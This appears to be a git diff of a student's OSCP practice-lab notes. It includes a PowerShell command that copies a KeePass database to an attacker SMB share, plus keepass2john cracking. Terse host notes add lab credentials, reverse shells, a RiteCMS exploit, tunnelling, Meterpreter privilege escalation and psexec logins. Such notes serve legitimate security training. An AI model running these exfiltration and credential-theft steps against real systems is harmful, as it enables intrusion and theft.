@@ -1066,8 +1066,8 @@ PS C:\Windows\System32\WindowsPowerShell\v1.0>
 └─$  python3 /home/kali/impacket/examples/smbserver.py -smb2support myshare . 
 Impacket v0.11.0 - Copyright 2023 Fortra
 
-PS C:\> copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.242\myshare\Database.kdbx
-copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.242\myshare\Database.kdbx
+PS C:\> copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.172\myshare\Database.kdbx
+copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.172\myshare\Database.kdbx
 
 ┌──(kali㉿kali)-[~/OSCP/labs/relia]
 └─$  keepass2john Database.kdbx > keepass1.hash
@@ -2351,16 +2351,23 @@ index 77e370c..0000000
 
 ## Revision 
 245 > 246 > 247 > 248 > 249 > 189/14/191 > 7 > 15 > 19 > 20 > 21
-
+45- web01
+46 - demo
+47 - web02
+48 - external
+49 - Legacy
 
 ## User
 ```
 anita
+emma
+Old
 ```
 ## Pass
 ```
 fireball
-
+SomersetVinyl1!
+HabitsAgesEnd123
 ```
 
 ## 6 
@@ -2371,6 +2378,9 @@ fireball
 ```
 ## 14 
 ```
+performed client side attack on 189 with mail info from 249. 
+
+listener capture 14 ip as jim and obtained local
 ```
 ## 15 
 ```
@@ -2386,9 +2396,11 @@ fireball
 ```
 ## 189 
 ```
+found database.kdbx and break it. 
 ```
 ## 191 
 ```
+xfreerdp login with obtained creds. 
 ```
 ## 245
 ```
@@ -2409,16 +2421,45 @@ proof.txt
 ```
 ## 246 
 ```
+sudo ssh -i anita_rsa anita@192.168.207.246 -p 2222
+local.txt 
+
+chisel setup 
+127.0.0.1/backend
+
+upload pentest monkey and get shell 
+all:all
+sudo su
+
 ```
 ## 247 
 ```
+anita
+
+use mark creds from umbraco for foothold
+
+use httpd.exe for priesc, use meterpreter listener and stageless exploit
 ```
 ## 248 
 ```
+smbclient 
+
+database.kdbx - welcome1 
+
+rdp as emma -local 
+
+rdp as mark - proof 
 ```
 ## 249 
 ```
+/cms
+exploit of ritecms 3.0 
+reverse shell
+local.txt
+history have damon creds
+impacket-psec login and obtained proof.txt 
 ```
 ## 250 
 ```
+win prep
 ```
